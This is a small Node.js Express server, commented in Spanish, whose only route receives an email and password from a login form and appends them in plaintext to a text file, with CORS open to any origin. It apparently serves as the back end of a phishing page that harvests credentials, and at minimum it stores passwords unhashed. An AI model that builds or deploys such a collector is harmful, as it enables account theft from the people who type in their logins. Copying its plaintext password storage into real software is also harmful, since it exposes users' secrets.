const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fs = require("fs");
const app = express();
const port = 3000;

// Configurar CORS para aceptar solicitudes desde el frontend
app.use(cors());

// Middleware para analizar los datos enviados en JSON
app.use(bodyParser.json());

// Ruta para recibir los datos del formulario
app.post("/save-data", (req, res) => {
  const { email, password } = req.body;

  // Formato para el contenido del archivo .txt
  const data = `Email: ${email}\nPassword: ${password}\n`;

  // Guardar los datos en un archivo .txt
  fs.appendFile("login-data.txt", data, (err) => {
    if (err) {
      console.error("Error al guardar los datos:", err);
      return res.status(500).send("Error al guardar los datos");
    }
    console.log("Datos guardados con éxito");
    res.send("Datos guardados con éxito");
  });
});

// Iniciar el servidor
app.listen(port, () => {
  console.log(`Servidor corriendo en http://localhost:${port}`);
});
